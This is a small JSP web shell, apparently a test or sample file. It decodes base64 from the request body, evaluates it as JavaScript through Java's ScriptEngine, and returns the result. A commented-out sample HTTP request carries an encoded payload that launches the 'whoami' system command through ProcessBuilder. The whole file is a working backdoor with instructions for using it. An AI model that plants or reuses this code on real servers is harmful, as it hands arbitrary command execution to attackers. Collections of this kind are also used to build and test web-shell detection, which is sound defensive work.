<%
    javax.script.ScriptEngine Engine = new javax.script.ScriptEngineManager().getEngineByExtension("js");
    Engine.eval(new String(new sun.misc.BASE64Decoder().decodeBuffer(request.getInputStream())));
    response.getWriter().println(Engine.get("result"));
%>

<!--

POST /test/script-engine-body.jsp HTTP/1.1
Host: 127.0.0.1:9090
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 372

dmFyIHJlc3VsdCA9ICIiOw0KdmFyIFByb2Nlc3NCdWlsZGVyID0gSmF2YS50eXBlKCJqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIiKTsNCnZhciBTY2FubmVyID0gSmF2YS50eXBlKCJqYXZhLnV0aWwuU2Nhbm5lciIpOw0KdmFyIHNjYW5uZXIgPSBuZXcgU2Nhbm5lcihuZXcgUHJvY2Vzc0J1aWxkZXIoWyJ3aG9hbWkiXSkuc3RhcnQoKS5nZXRJbnB1dFN0cmVhbSgpKS51c2VEZWxpbWl0ZXIoIlxcQSIpOw0KcmVzdWx0ID0gc2Nhbm5lci5oYXNOZXh0KCkgPyBzY2FubmVyLm5leHQoKSA6IiI7
-->